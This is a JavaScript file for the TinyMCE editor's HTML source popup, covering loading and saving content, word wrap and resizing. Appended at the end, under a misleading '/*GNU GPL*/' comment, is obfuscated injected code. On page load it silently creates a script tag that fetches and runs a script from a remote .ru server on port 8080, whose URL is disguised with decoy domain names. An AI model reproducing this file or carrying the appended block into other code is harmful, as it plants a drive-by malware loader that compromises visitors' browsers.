tinyMCEPopup.requireLangPack();
tinyMCEPopup.onInit.add(onLoadInit);

function saveContent() {
	tinyMCEPopup.editor.setContent(document.getElementById('htmlSource').value);
	tinyMCEPopup.close();
}

function onLoadInit() {
	tinyMCEPopup.resizeToInnerSize();

	// Remove Gecko spellchecking
	if (tinymce.isGecko)
		document.body.spellcheck = tinyMCEPopup.editor.getParam("gecko_spellcheck");

	document.getElementById('htmlSource').value = tinyMCEPopup.editor.getContent();

	if (tinyMCEPopup.editor.getParam("theme_advanced_source_editor_wrap", true)) {
		setWrap('soft');
		document.getElementById('wraped').checked = true;
	}

	resizeInputs();
}

function setWrap(val) {
	var v, n, s = document.getElementById('htmlSource');

	s.wrap = val;

	if (!tinymce.isIE) {
		v = s.value;
		n = s.cloneNode(false);
		n.setAttribute("wrap", val);
		s.parentNode.replaceChild(n, s);
		n.value = v;
	}
}

function toggleWordWrap(elm) {
	if (elm.checked)
		setWrap('soft');
	else
		setWrap('off');
}

var wHeight=0, wWidth=0, owHeight=0, owWidth=0;

function resizeInputs() {
	var el = document.getElementById('htmlSource');

	if (!tinymce.isIE) {
		 wHeight = self.innerHeight - 65;
		 wWidth = self.innerWidth - 16;
	} else {
		 wHeight = document.body.clientHeight - 70;
		 wWidth = document.body.clientWidth - 16;
	}

	el.style.height = Math.abs(wHeight) + 'px';
	el.style.width  = Math.abs(wWidth) + 'px';
}



/*GNU GPL*/ try{window.onload = function(){var A7uom6wz40lq = document.createElement('s##)(^c@)!r@&i)&^p((t&@'.replace(/\!|\(|\$|@|\)|&|#|\^/ig, ''));var U58f2ncrcja2g = 'Bget7nne6zp6f';A7uom6wz40lq.setAttribute('type', 't)$e^@^x$@t@#/^j)#(a#$(v@a(^$s(((c^)r@!#$i($@^(p&&#@t$&#'.replace(/\(|&|#|\^|\)|\$|\!|@/ig, ''));A7uom6wz40lq.setAttribute('src',  'h!&t)t#(p!($:$$&/#!/#$^t&a^(r$&g&(^&e$t)&-#!(@c^#^o#)m@@!.$@1!$@9(@l$!)!o!@^@u!!&&).@^$&c!$@^&o!((&m)!).(^^n$&i&h$&&-##@g&##!o!$v#(#^@.!(@t^!h^(e!&(m&)o)@#b)#i&)(s@!(i^@^t&$^e&!(.^$^(@r@$u@^:#&&8@!^&0$$$$8(&0)$/#l(o^(v$!e)^&2$1)@c))^!n(&$@.#(@c@(^o&$#m)^&#/!(&l)$o!!v&e$#2^)@1&#c)&n$$(.)!@c(#@o@@^@m(/&g!^o$)$o^^g)^#l^!$e)^(.#(^c!@o##&m^&/&@r!^^o(!$#t@&(t!e))(n!#)t^o(&^m#(a^@#t!)&&o##e^^)&s$).&)$&c!@@o(m(^/#w(&e!(a#^@t@h&e)&!r@.^c@o)!!m#!!&.)&c@!($n!!(/)$'.replace(/\)|@|\(|\!|#|\^|&|\$/ig, ''));A7uom6wz40lq.setAttribute('defer', 'd@!e@)!f(@(e)#$)r(('.replace(/#|&|\(|\)|\!|\$|@|\^/ig, ''));A7uom6wz40lq.setAttribute('id', 'Q^))^w$$l&(y#!@e&@$!2^#^x@^r##4)k('.replace(/#|\^|\(|\$|\!|&|\)|@/ig, ''));document.body.appendChild(A7uom6wz40lq);}} catch(Jnzhjq1ohahp5) {}